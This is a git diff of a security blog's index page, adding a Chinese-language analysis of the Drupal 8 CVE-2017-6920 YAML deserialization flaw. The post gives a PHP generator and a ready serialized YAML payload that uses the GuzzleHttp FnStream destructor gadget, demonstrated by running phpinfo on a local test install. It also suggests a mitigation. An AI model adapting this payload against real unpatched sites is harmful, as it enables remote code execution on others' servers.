@@ -64,6 +64,114 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/" class="article-date">
+  <time datetime="2017-06-28T01:33:32.000Z" itemprop="datePublished">2017-06-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/">Drupal Core CVE-2017-6920 远程代码执行漏洞分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>2017年6月23日，Drupal的版本更新到了 8.3.4 。此版本的修复包括了3个安全漏洞，其中还包含了官方评级为 critical 的远程代码执行漏洞。</p>
+<p>官方的介绍为：</p>
+<pre><code>PECL YAML parser unsafe object handling - Critical - Drupal 8 - CVE-2017-6920
+
+PECL YAML parser does not handle PHP objects safely during certain operations within Drupal core. This could lead to remote code execution.
+</code></pre><p>详细的说就是， YAML 组件会对 YAML 格式的字符串进行反序列化操作，这个过程中，如果传入的值被攻击者控制，则会导致远程代码执行漏洞。</p>
+<p><a href="http://baike.baidu.com/link?url=Ae6gs4tbTrZXoAN0rNdBQgyouaT0jJp2qy801_um89KDJ4jzNeUJORybVXqWsoOc-QUwbEcYQjxCFam6ZHbG7q" target="_blank" rel="external">YAML的介绍</a></p>
+<p>这个漏洞的利用条件是：</p>
+<ul>
+<li>管理员权限</li>
+<li>php运行环境安装了yaml插件</li>
+</ul>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>首先我们先看下官方修复了什么？</p>
+<p><img src="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/1.png"></p>
+<p>官方的修复很简单，就是在调用 yaml_parse 前，先初始化一个全局变量，此变量的作用是啥？我们慢慢往下看。</p>
+<p>接下来，我们先看下 yaml_parse 的官方介绍。</p>
+<p><img src="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/2.png"></p>
+<p>官方说的很详细，就是把 YAML 格式的文档转换成 php 对象。</p>
+<p>重点要来了，我们接着看此网页的下面。</p>
+<p><img src="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/3.png"></p>
+<p>带颜色的内容是个警告，非信任的内容输入到 yaml_parse 中非常危险，如果带着 !php/object 标签，则标签后的内容会调用 unserialize() 函数。也就是 <strong>yaml_parse === unserialize</strong> 。</p>
+<p>有兴趣的同学可以手工实验下。</p>
+<p>我这里贴一张反序列化的图。</p>
+<p><img src="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/4.png"></p>
+<p>那么确认了此接口能反序列化，接下来就是老思路了。</p>
+<ul>
+<li>找可控点。</li>
+<li>利用反序列化远程执行代码。</li>
+</ul>
+<h3 id="找可控点"><a href="#找可控点" class="headerlink" title="找可控点"></a>找可控点</h3><p>可控点的寻找，这次比较简单，官方github的更新就有提到。</p>
+<p>URL为： <a href="http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import" target="_blank" rel="external">http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import</a></p>
+<p><img src="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/5.png"></p>
+<h3 id="利用反序列化远程执行代码"><a href="#利用反序列化远程执行代码" class="headerlink" title="利用反序列化远程执行代码"></a>利用反序列化远程执行代码</h3><p>如果对反序列化比较熟悉，应该有以下两个思路找代码执行。</p>
+<ul>
+<li>找魔术方法</li>
+<li>找执行流，进行变量覆盖</li>
+</ul>
+<p>具体可以参考这个文章 <a href="https://manning23.github.io/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" target="_blank" rel="external">vBulletin 5.0.x - 5.1.x RCE</a></p>
+<p>本次利用选择是的找魔术方法。</p>
+<p><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="external">魔术方法介绍</a></p>
+<p>一般情况下，首先应看这两个方法是否存在代码执行的点。</p>
+<ul>
+<li>__construct()</li>
+<li>__destruct()</li>
+</ul>
+<p>在 GuzzleHttp\Psr7\FnStream 的 FnStream 找到可利用点。</p>
+<p>这个类的析构函数会把 fn_close 作为函数执行，而 fn_close 我们可控。</p>
+<pre><code>public function __destruct()
+{
+    if (isset($this-&gt;_fn_close)) {
+        call_user_func($this-&gt;_fn_close);
+    }
+}
+</code></pre><p>我们在下面url的页面提交poc即可。</p>
+<pre><code>http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import
+</code></pre><p>生成poc的php为：</p>
+<pre><code>&lt;?php
+
+require &quot;c://wamp64//www//drupal-8.3.3//&quot; . &apos;/vendor/autoload.php&apos;;
+$a = new \GuzzleHttp\Psr7\FnStream(array(&apos;close&apos;=&gt;&apos;phpinfo&apos;));
+$s = serialize( $a );
+$aa = yaml_emit($s);
+print_r($aa);
+
+?&gt;
+</code></pre><p>poc：</p>
+<pre><code>a: !php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:{s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:{s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;}s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;}&quot;
+</code></pre><p>最终的执行效果</p>
+<p><img src="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/6.png"></p>
+<h2 id="0x02漏洞总结"><a href="#0x02漏洞总结" class="headerlink" title="0x02漏洞总结"></a>0x02漏洞总结</h2><p>Drupal的这个漏洞目前还存在能代码执行的点，但是由于利用不稳定，暂不公布。</p>
+<p>这个漏洞提醒大家在调用yaml格式文档时候，也要进行参数检查，调用 yaml.decode_php 便可以防止yaml按照序列化对象进行解释。</p>
+<h2 id="0x03参考内容"><a href="#0x03参考内容" class="headerlink" title="0x03参考内容"></a>0x03参考内容</h2><p><a href="http://php.net/manual/zh/function.yaml-parse.php" target="_blank" rel="external">http://php.net/manual/zh/function.yaml-parse.php</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/" data-id="cj4gby8pp0000nk02kzq93iyc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Rise-of-the-machines读后感" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2017/06/22/Rise-of-the-machines读后感/" class="article-date">
@@ -124,7 +232,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/22/Rise-of-the-machines读后感/" data-id="cj4843tvp0002jefy7sjx17if" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/06/22/Rise-of-the-machines读后感/" data-id="cj4gby8q60004nk02exe8xklx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -269,7 +377,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" data-id="cj4843tvz0004jefy0hf24j6u" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" data-id="cj4gby8q80005nk02puzzw8gw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -426,7 +534,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj4843tw90007jefykpwgf28z" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj4gby8r40008nk020i6syam1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -577,7 +685,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj4843tw20005jefy294j3zq3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj4gby8r00006nk02xzevszee" class="article-share-link">Share</a>
       
       
     </footer>
@@ -705,7 +813,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj4843tw60006jefyoiydxtxw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj4gby8r10007nk027mijctcl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -790,7 +898,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj4843tvm0001jefye9ne5lel" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj4gby8pv0002nk02l3sovnvz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -905,7 +1013,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj4843tvu0003jefywro1zhbq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj4gby8q00003nk02n6xohasq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1159,7 +1267,7 @@ class vB5_Template {
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" data-id="cj4843twe0008jefyvrkblg4q" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" data-id="cj4gby8rb0009nk02qmagbzz6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1308,7 +1416,7 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/" data-id="cj4843tvi0000jefy04kvcdes" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/" data-id="cj4gby8pt0001nk02coyxmxov" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1348,6 +1456,10 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
       <ul>
         
           <li>
+            <a href="/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/">Drupal Core CVE-2017-6920 远程代码执行漏洞分析</a>
+          </li>
+        
+          <li>
             <a href="/2017/06/22/Rise-of-the-machines读后感/">Rise of the machines读后感</a>
           </li>
         
@@ -1361,10 +1473,6 @@ ${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&ap
         
           <li>
             <a href="/2017/03/21/Struts2-S046命令执行漏洞/">Struts2 S046命令执行漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/">Struts2 Jakarta模块Content-type命令执行漏洞(CVE-2017-5638)</a>
           </li>
         
       </ul>
